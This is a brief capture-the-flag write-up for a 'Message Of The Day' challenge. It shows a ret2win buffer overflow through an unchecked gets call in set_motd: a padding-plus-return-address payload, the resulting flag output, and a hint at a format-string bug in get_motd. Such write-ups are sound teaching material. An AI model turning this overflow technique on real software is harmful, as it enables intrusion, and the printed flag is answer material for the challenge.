# Message Of The Day

I was not expecting a repeating challenge, but this one is easy so I'm not going to dive too deep.

The function `0x60606137 set_motd` is using a `gets` without any verifications,
it means we can redirect the flow to the function that prints the flag `0x606063A5 read_flag`

```
func = 0x00000000606063A5
conn.sendline('A' * 0x108 + struct.pack('<Q', func))
```

```
New msg: New message of the day saved!
Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
```

Also there might be a `printf` exploit inside `0x606061A4 get_motd`, just in case the overflow isn't enough for you :)